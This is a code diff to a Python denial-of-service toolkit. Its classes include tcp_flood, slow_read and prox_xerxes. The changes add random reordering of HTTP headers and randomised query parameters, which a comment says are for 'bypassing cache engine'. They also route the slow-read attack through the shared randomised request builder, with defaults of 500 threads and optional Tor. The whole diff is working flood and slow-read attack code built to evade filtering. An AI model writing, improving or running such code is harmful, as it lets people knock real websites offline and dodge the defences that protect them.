@@ -31,18 +31,30 @@ if ((termux==False) or (adr==False)):
 
 
 
+def reorder_headers_randomly(s):
+ b=s.split('\r\n\r\n')[1]
+ a=s.split('\r\n\r\n')[0]
+ m=a.split('\r\n')[0]
+ c=a.split('\r\n')[1:]
+ random.shuffle(c)
+ return m+"\r\n"+"\r\n".join(c)+'\r\n\r\n'+b
 
 
-
+def random_param():
+ a=random.randint(1,2)
+ if a==1:
+  return str(random.randint(1,1000))
+ else:
+  return random.choice(lis)
 
 def setup_http_packet(target,ty,paths,post_field_min,post_field_max,post_min,post_max):
       pa=random.choice(paths)#bypassing cache engine
       q=''
       for i in range(random.randint(2,5)):
-       q+=random.choice(lis)+str(random.randint(1,100000))
+       q+=random_param()+random_param()
       p=''
       for i in range(random.randint(2,5)):
-       p+=random.choice(lis)+str(random.randint(1,100000))
+       p+=random_param()+random_param()
       if '?' in pa:
        jo='&'
       else:
@@ -75,7 +87,7 @@ def setup_http_packet(target,ty,paths,post_field_min,post_field_max,post_min,pos
         j+=random.choice(lis)
        par =k+'='+j
        m= "POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: {}\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n{}".format(pa,random.choice(ua),l,random.randint(300,1000),len(par),(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),target,par)
-      return m
+      return reorder_headers_randomly(m)
 
 def get_public_dns(timeout=15):
  try:
@@ -316,6 +328,7 @@ class tcp_flood:
    self.stop=True
    a=self.__dict__["counter"]
    self.reset()
+   self.__del__()
    return a
  
 '''
@@ -901,11 +914,12 @@ class prox_xerxes:
 '''
 
 class slow_read:
- def __init__(self,u,p=80,threads_daemon=False,threads=500,timeout=5,min_speed=3,max_speed=5,max_read=3,min_read=1,logs=False,tor=False,duration=60):
+ def __init__(self,u,p=80,paths=["/"],threads_daemon=False,threads=500,timeout=5,min_speed=3,max_speed=5,max_read=3,min_read=1,logs=False,tor=False,duration=60):
   self.counter=0
   self.stop=False
   self.target=u
   self.port=p
+  self.paths=paths
   self.timeout=timeout
   self.tor=tor
   self.read_max=max_read
@@ -941,27 +955,8 @@ class slow_read:
        break
       if self.stop==True:
        break
-      pa=random.choice(paths)
-      q=''
-      for i in range(random.randint(2,5)):
-       q+=random.choice(lis)+str(random.randint(1,100000))
-      p=''
-      for i in range(random.randint(2,5)):
-       p+=random.choice(lis)+str(random.randint(1,100000))
-      if '?' in pa:
-       jo='&'
-      else:
-       jo='?' 
-      pa+=jo+q+"="+p
       try:
-       g=random.randint(1,2)
-       if g==1:
-        s.send("GET {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nReferer: {}\r\nHost: {}\r\n\r\n".format(pa,random.choice(ua),random.randint(300,1000),(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),self.target).encode('utf-8'))
-       else:
-        q='q='
-        for i in range(10,random.randint(20,50)):
-         q+=random.choice(lis)
-        s.send("POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n{}".format(pa,random.choice(ua),random.randint(300,1000),len(q),(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),self.target,q).encode('utf-8'))
+       s.send(setup_http_packet(self.target,3,self.paths,2,8,10,50).encode('utf-8'))
        self.counter+=1
        while True:    
         d=s.recv(random.randint(self.read_min,self.read_max))
